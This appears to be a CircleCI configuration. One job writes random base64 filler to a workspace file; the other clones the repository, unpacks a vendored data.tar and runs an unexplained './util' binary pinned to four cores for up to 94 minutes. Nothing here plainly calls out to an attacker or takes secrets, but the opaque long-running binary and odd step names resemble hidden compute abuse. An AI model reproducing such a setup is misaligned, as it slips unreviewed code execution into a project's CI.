version: 2.1

jobs:
  preflight_oct16-cleanup:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: feather tinder
          command: |
            mkdir -p /tmp/cache
            set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1024 count=300 2>/dev/null | base64 > /tmp/cache/final.md; true
            du -h /tmp/cache/final.md
      - persist_to_workspace:
          root: /tmp/cache
          paths:
            - final.md
  oct16-cleanup:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/cache
      - run:
          name: Pull handoff
          command: |
            awk 'END{print NR}' /tmp/cache/main_job_output_v3.log || true
      - run:
          name: Retrieve sources
          command: git clone --depth 2 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Restore vendored sources
          command: cat data.tar | tar xf -
      - run:
          no_output_timeout: 94m
          command: taskset -c 0-3 ./util
